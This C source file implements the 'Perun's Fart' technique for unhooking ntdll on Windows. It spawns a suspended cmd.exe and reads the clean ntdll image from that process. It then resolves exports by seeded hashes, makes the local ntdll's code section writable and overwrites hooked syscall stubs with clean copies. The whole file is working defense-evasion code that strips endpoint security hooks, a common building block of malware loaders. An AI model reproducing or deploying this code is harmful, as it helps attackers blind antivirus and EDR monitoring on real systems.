#include <Windows.h>
#include "structs.h"
#include "common.h"

#define PROCESS "cmd.exe"
#define SYSCALL_STUB 23
#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)

struct MyStruct ConfigStruct = { 0 };



BOOL CreateSuspendedProcess(PVOID pNtdll, DWORD NtdllSize, LPVOID* Ntdll) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof si);
    ZeroMemory(&pi, sizeof pi);


    if (!CreateProcessA(
        "C:\\Windows\\System32\\"PROCESS,
        NULL,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return FALSE;
    }

    LPVOID buffer = HeapAlloc(GetProcessHeap(), 0, NtdllSize);
    if (buffer == 0) {
        return FALSE;
    }

    if (buffer != 0 && !ReadProcessMemory(pi.hProcess, (LPCVOID)pNtdll, buffer, NtdllSize, NULL)) {
        return FALSE;
    }

    *Ntdll = buffer;

    CloseHandle(pi.hThread);
    TerminateProcess(pi.hProcess, 0);

    if (*Ntdll == NULL)
        return FALSE;

    return TRUE;
}



VOID InitializeStruct(PVOID pNtdll, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory) {
    ConfigStruct.pImageExportDirectory = pImageExportDirectory;
    ConfigStruct.pdwAddressOfFunctions = (PDWORD)((PBYTE)pNtdll + pImageExportDirectory->AddressOfFunctions);
    ConfigStruct.pdwAddressOfNames = (PDWORD)((PBYTE)pNtdll + pImageExportDirectory->AddressOfNames);
    ConfigStruct.pwAddressOfNameOrdinales = (PWORD)((PBYTE)pNtdll + pImageExportDirectory->AddressOfNameOrdinals);
}




PVOID GetDll(PWSTR FindName) {

    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->LoaderData;
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)pLdr->InMemoryOrderModuleList.Flink;

    while (pDte) {
        PWSTR DllName = ((PLDR_DATA_TABLE_ENTRY)pDte)->FullDllName.Buffer;
        if (wcscmp(FindName, DllName) == 0) {
            return (PVOID)((PLDR_DATA_TABLE_ENTRY)pDte)->InInitializationOrderLinks.Flink;
        }
        pDte = DEREF_64(pDte);
    }
    return NULL;
}

PVOID GetFunction(PVOID pNtdll, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, INT InFunctionHash) {

    if (ConfigStruct.pdwAddressOfFunctions == NULL || ConfigStruct.pdwAddressOfNames == NULL ||
        ConfigStruct.pImageExportDirectory == NULL || ConfigStruct.pwAddressOfNameOrdinales == NULL) {

        InitializeStruct(pNtdll, pImageExportDirectory);
    }

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pNtdll + ConfigStruct.pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pNtdll + ConfigStruct.pdwAddressOfFunctions[ConfigStruct.pwAddressOfNameOrdinales[cx]];

        if (HashStringRotr32A(pczFunctionName, ConfigStruct.Seed) == InFunctionHash) {
            WORD cw = 0;
            while (TRUE) {

                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05) {
                    return NULL;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0xc3) {
                    return NULL;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {

                    return pFunctionAddress;
                }

                cw++;
            }
        }
    }
    return NULL;
}


VOID OverwriteNtdll(
    PVOID pLocalNtdll,
    PVOID pRemoteNdll,
    PIMAGE_EXPORT_DIRECTORY pLocalImageExportDirectory,
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
    PIMAGE_SECTION_HEADER TxtSextion) {


    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pLocalNtdll + pLocalImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pLocalNtdll + pLocalImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pLocalNtdll + pLocalImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pLocalImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pLocalNtdll + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pLocalNtdll + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        PVOID funcAddress = GetFunction(pRemoteNdll, pImageExportDirectory, HashStringRotr32A(pczFunctionName, ConfigStruct.Seed));
        if (funcAddress != NULL) {
            DWORD Old;
            VirtualProtect((LPVOID)((DWORD_PTR)pLocalNtdll + (DWORD_PTR)TxtSextion->VirtualAddress), TxtSextion->Misc.VirtualSize, PAGE_EXECUTE_WRITECOPY, &Old);
            memcpy((LPVOID)pFunctionAddress, (LPVOID)funcAddress, SYSCALL_STUB);
            VirtualProtect((LPVOID)((DWORD_PTR)pLocalNtdll + (DWORD_PTR)TxtSextion->VirtualAddress), TxtSextion->Misc.VirtualSize, Old, &Old);
            //printf("[+] installed \'%s\' at [ 0x%p ]\n", pczFunctionName, funcAddress);
        }
    }
}

VOID ReplaceNtdll(PVOID pLocalNtdll, PVOID pRemoteNdtll, PIMAGE_SECTION_HEADER TxtSextion) {

    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pRemoteNdtll;
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pRemoteNdtll + pImageDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pRemoteNdtll + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    pImageDosHeader = (PIMAGE_DOS_HEADER)pLocalNtdll;
    pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pImageDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pLocalImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pLocalNtdll + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    OverwriteNtdll(pLocalNtdll, pRemoteNdtll, pLocalImageExportDirectory, pImageExportDirectory, TxtSextion);

    free(pRemoteNdtll);
}




//exported
BOOL PerunsFart() {

    srand(NULL);

    ConfigStruct.Seed = rand() % 20 + 1;

    LPVOID RemoteNtdll = NULL;

    PVOID pLocalNtdll = GetDll(TEXT("ntdll.dll"));
    if (pLocalNtdll == NULL)
    {
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pLocalNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pLocalNtdll + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNtHeaders->OptionalHeader;
    PIMAGE_SECTION_HEADER TxtSextion = IMAGE_FIRST_SECTION(pNtHeaders);
    DWORD NtdllSize = pOptionalHeader->SizeOfImage;

    if (!CreateSuspendedProcess(pLocalNtdll, NtdllSize, &RemoteNtdll)) {
        return FALSE;
    }

    ReplaceNtdll(pLocalNtdll, RemoteNtdll, TxtSextion);

    return TRUE;
}